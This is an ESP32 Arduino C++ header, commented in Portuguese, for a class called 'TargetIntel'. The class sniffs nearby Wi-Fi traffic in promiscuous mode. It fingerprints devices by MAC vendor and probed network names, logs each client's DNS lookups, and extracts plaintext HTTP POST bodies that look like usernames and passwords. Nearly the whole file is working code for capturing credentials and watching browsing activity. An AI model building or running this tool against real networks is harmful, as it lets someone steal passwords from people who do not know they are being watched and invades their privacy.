#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include <map>
#include "../utils/logger.h"
#include "scanner.h"

/*
 * Target Intelligence — coleta informações sobre alvos:
 *  - OUI lookup (fabricante do dispositivo pelo MAC)
 *  - Fingerprint passivo via probe requests (SO/dispositivo)
 *  - Captura de credenciais HTTP em texto claro
 *  - Captura de DNS queries (domínios visitados)
 *  - Mapa de rede (APs e seus clientes)
 */
class TargetIntel {
public:
    static TargetIntel& get() { static TargetIntel inst; return inst; }

    bool running = false;

    struct DeviceInfo {
        String mac;
        String manufacturer;
        String deviceType;       // iPhone, Android, Windows, Router...
        String os;
        std::vector<String> probedSSIDs;
        int    rssi;
        unsigned long firstSeen, lastSeen;
    };
    struct DNSQuery {
        String clientMac;
        String domain;
        unsigned long ts;
    };
    struct HTTPCred {
        String clientMac;
        String host;
        String path;
        String body; // POST body (pode conter user/pass)
        unsigned long ts;
    };

    std::vector<DeviceInfo> devices;
    std::vector<DNSQuery>   dnsQueries;
    std::vector<HTTPCred>   httpCreds;

    void start() {
        running = true;
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&_rxCb);
        LOG.warn("[INTEL] Target Intelligence ativo");
    }

    void stop() {
        running = false;
        esp_wifi_set_promiscuous(false);
        LOG.info("[INTEL] Parado | dispositivos:" + String(devices.size()) +
                 " dns:" + String(dnsQueries.size()) +
                 " http:" + String(httpCreds.size()));
    }

    // Lookup OUI — identifica fabricante pelo MAC
    static String lookupOUI(const String& mac) {
        if (mac.length() < 8) return "Unknown";
        String prefix = mac.substring(0, 8);
        prefix.toUpperCase();
        // Tabela dos fabricantes mais comuns
        struct { const char* oui; const char* name; } table[] = {
            {"B8:27:EB","Raspberry Pi"},
            {"DC:A6:32","Raspberry Pi"},
            {"E4:5F:01","Raspberry Pi"},
            {"00:50:F2","Microsoft"},
            {"28:CF:E9","Apple"},
            {"AC:BC:32","Apple"},
            {"F0:18:98","Apple"},
            {"84:85:06","Apple"},
            {"A4:C3:F0","Apple"},
            {"3C:CD:5D","Apple"},
            {"14:F6:5A","Apple"},
            {"10:9A:DD","Apple"},
            {"38:F9:D3","Apple"},
            {"68:09:27","Samsung"},
            {"E4:92:FB","Samsung"},
            {"A0:82:1F","Samsung"},
            {"50:A4:D0","Samsung"},
            {"F4:42:8F","Google"},
            {"54:60:09","Google"},
            {"48:D6:D5","Google"},
            {"90:61:AE","Xiaomi"},
            {"08:21:EF","Xiaomi"},
            {"78:11:DC","Xiaomi"},
            {"60:38:E0","Xiaomi"},
            {"94:B8:6D","Motorola"},
            {"00:24:1D","Motorola"},
            {"14:2D:27","TP-Link"},
            {"14:CC:20","TP-Link"},
            {"50:3E:AA","TP-Link"},
            {"C4:E9:84","TP-Link"},
            {"30:9C:23","Netgear"},
            {"A0:63:91","Netgear"},
            {"C4:04:15","Netgear"},
            {"C0:3F:D5","D-Link"},
            {"28:10:7B","D-Link"},
            {"B0:C5:54","Asus"},
            {"10:7B:44","Asus"},
            {"60:45:CB","Intelbras"},
            {"00:1E:8C","Intelbras"},
            {"DC:9F:DB","Huawei"},
            {"48:46:FB","Huawei"},
            {"70:72:CF","Huawei"},
            {nullptr, nullptr}
        };
        for (int i = 0; table[i].oui; i++)
            if (prefix.startsWith(table[i].oui)) return String(table[i].name);
        return "Unknown";
    }

    // Fingerprint por probe requests
    static String fingerprintDevice(const std::vector<String>& ssids, const String& mac) {
        String mfr = lookupOUI(mac);
        if (mfr == "Apple") return "iOS/macOS — Apple";
        if (mfr == "Samsung") return "Android — Samsung";
        if (mfr == "Xiaomi") return "Android — Xiaomi";
        if (mfr == "Motorola") return "Android — Motorola";
        if (mfr == "Google") return "Android/ChromeOS — Google";
        if (mfr == "Microsoft") return "Windows — Microsoft";
        if (mfr.indexOf("Link") >= 0 || mfr == "Netgear" ||
            mfr == "Asus" || mfr == "Huawei" || mfr == "Intelbras")
            return "Router/AP — " + mfr;
        // Fingerprint por SSIDs conhecidos
        for (auto& s : ssids) {
            if (s.indexOf("iPhone") >= 0) return "iOS — iPhone";
            if (s.indexOf("Android") >= 0) return "Android";
            if (s.indexOf("Galaxy") >= 0) return "Android — Samsung";
        }
        return mfr.isEmpty() ? "Unknown" : mfr;
    }

    void updateDevice(const String& mac, int rssi, const String& probedSSID = "") {
        for (auto& d : devices) {
            if (d.mac == mac) {
                d.rssi = rssi;
                d.lastSeen = millis();
                if (probedSSID.length() > 0) {
                    bool found = false;
                    for (auto& s : d.probedSSIDs) if (s == probedSSID) { found = true; break; }
                    if (!found && d.probedSSIDs.size() < 20) d.probedSSIDs.push_back(probedSSID);
                    d.deviceType = fingerprintDevice(d.probedSSIDs, mac);
                }
                return;
            }
        }
        if (devices.size() >= 128) return;
        DeviceInfo di;
        di.mac          = mac;
        di.rssi         = rssi;
        di.firstSeen    = millis();
        di.lastSeen     = millis();
        di.manufacturer = lookupOUI(mac);
        if (probedSSID.length() > 0) di.probedSSIDs.push_back(probedSSID);
        di.deviceType   = fingerprintDevice(di.probedSSIDs, mac);
        di.os           = "";
        devices.push_back(di);
        LOG.data("[INTEL] Novo dispositivo: " + mac + " [" + di.manufacturer + "]");
    }

private:
    struct Hdr {
        uint16_t fc, dur;
        uint8_t  a1[6], a2[6], a3[6];
        uint16_t seq;
    } __attribute__((packed));

    static String _macStr(const uint8_t* b) {
        char buf[18];
        snprintf(buf,18,"%02X:%02X:%02X:%02X:%02X:%02X",b[0],b[1],b[2],b[3],b[4],b[5]);
        return buf;
    }

    // Tenta extrair consulta DNS (UDP porta 53) de pacote data 802.11
    static void _parseDNS(const uint8_t* payload, size_t len, const String& srcMac) {
        // Precisamos de: 802.11 header(24) + LLC(8) + IP(>=20) + UDP(8) + DNS
        if (len < 24+8+20+8+12) return;
        const uint8_t* llc = payload + 24;
        // LLC: AA AA 03 00 00 00 08 00 = IPv4
        if (llc[6] != 0x08 || llc[7] != 0x00) return;
        const uint8_t* ip = llc + 8;
        if ((ip[0] & 0xF0) != 0x40) return; // IPv4
        uint8_t ihl = (ip[0] & 0x0F) * 4;
        if (ip[9] != 0x11) return; // UDP
        const uint8_t* udp = ip + ihl;
        uint16_t dport = (udp[2]<<8)|udp[3];
        if (dport != 53) return;
        const uint8_t* dns = udp + 8;
        size_t dnsLen = len - (dns - payload);
        if (dnsLen < 12) return;
        uint16_t flags = (dns[2]<<8)|dns[3];
        if (flags & 0x8000) return; // resposta, não query
        // Extrai o primeiro domínio da query section (offset 12)
        const uint8_t* q = dns + 12;
        size_t qlen = dnsLen - 12;
        String domain = "";
        size_t qi = 0;
        while (qi < qlen && q[qi] != 0) {
            uint8_t lbl = q[qi++];
            if (lbl > 63 || qi + lbl > qlen) break;
            if (domain.length() > 0) domain += ".";
            for (int i = 0; i < lbl; i++) domain += (char)q[qi++];
        }
        if (domain.length() > 3) {
            auto& self = TargetIntel::get();
            if (self.dnsQueries.size() < 200) {
                // Evita duplicatas recentes
                bool dup = false;
                for (auto& dq : self.dnsQueries)
                    if (dq.domain == domain && dq.clientMac == srcMac) { dup=true; break; }
                if (!dup) {
                    self.dnsQueries.push_back({srcMac, domain, millis()});
                    LOG.data("[DNS] " + srcMac + " -> " + domain);
                }
            }
        }
    }

    // Tenta extrair credenciais HTTP (POST com user=/pass=)
    static void _parseHTTP(const uint8_t* payload, size_t len, const String& srcMac) {
        if (len < 24+8+20+20+10) return;
        const uint8_t* llc = payload + 24;
        if (llc[6] != 0x08 || llc[7] != 0x00) return;
        const uint8_t* ip = llc + 8;
        if ((ip[0] & 0xF0) != 0x40) return;
        uint8_t ihl = (ip[0] & 0x0F) * 4;
        if (ip[9] != 0x06) return; // TCP
        const uint8_t* tcp = ip + ihl;
        uint16_t dport = (tcp[2]<<8)|tcp[3];
        if (dport != 80 && dport != 8080 && dport != 8888) return;
        uint8_t tcphl = ((tcp[12] & 0xF0) >> 4) * 4;
        const uint8_t* http = tcp + tcphl;
        size_t httpLen = len - (http - payload);
        if (httpLen < 4) return;
        // Só processa POST
        if (memcmp(http, "POST", 4) != 0) return;
        // Extrai Host e body
        String raw = "";
        for (size_t i = 0; i < min(httpLen, (size_t)512); i++)
            raw += (char)(http[i]);
        String host = "", path = "", body = "";
        int hi = raw.indexOf("Host: ");
        if (hi >= 0) {
            int he = raw.indexOf('\r', hi);
            host = raw.substring(hi+6, he);
        }
        int pi = raw.indexOf("POST ");
        if (pi >= 0) {
            int pe = raw.indexOf(' ', pi+5);
            path = raw.substring(pi+5, pe);
        }
        int bi = raw.indexOf("\r\n\r\n");
        if (bi >= 0) body = raw.substring(bi+4);
        // Só salva se body parece conter credencial
        String bl = body; bl.toLowerCase();
        if (bl.indexOf("pass") >= 0 || bl.indexOf("pwd") >= 0 ||
            bl.indexOf("senha") >= 0 || bl.indexOf("login") >= 0 ||
            bl.indexOf("user") >= 0) {
            auto& self = TargetIntel::get();
            if (self.httpCreds.size() < 50) {
                self.httpCreds.push_back({srcMac, host, path, body.substring(0,256), millis()});
                LOG.warn("[HTTP CRED] " + srcMac + " POST " + host + path);
            }
        }
    }

    static void _rxCb(void* buf, wifi_promiscuous_pkt_type_t) {
        auto& self = TargetIntel::get();
        if (!self.running) return;
        auto* pkt  = (wifi_promiscuous_pkt_t*)buf;
        size_t len = pkt->rx_ctrl.sig_len;
        if (len < 24) return;
        auto* hdr = (Hdr*)pkt->payload;
        uint8_t ft  = (hdr->fc & 0x000C) >> 2;
        uint8_t fst = (hdr->fc & 0x00F0) >> 4;
        String mac2 = _macStr(hdr->a2);
        int rssi = pkt->rx_ctrl.rssi;
        if (ft == 0x00) {  // Management
            if (fst == 0x04) { // Probe Request
                const uint8_t* body = pkt->payload + 24;
                size_t blen = len > 24 ? len - 24 : 0;
                String ssid = "";
                if (blen >= 2 && body[0] == 0x00) {
                    uint8_t sl = body[1];
                    if (sl > 0 && sl <= 32 && blen >= (size_t)(2+sl))
                        ssid = String((char*)(body+2)).substring(0, sl);
                }
                self.updateDevice(mac2, rssi, ssid);
            } else if (fst == 0x00 || fst == 0x02 || fst == 0x0B) {
                // Assoc/Reassoc/Auth — registra dispositivo
                self.updateDevice(mac2, rssi);
            }
        } else if (ft == 0x02) { // Data
            self.updateDevice(mac2, rssi);
            _parseDNS(pkt->payload, len, mac2);
            _parseHTTP(pkt->payload, len, mac2);
        }
    }
};
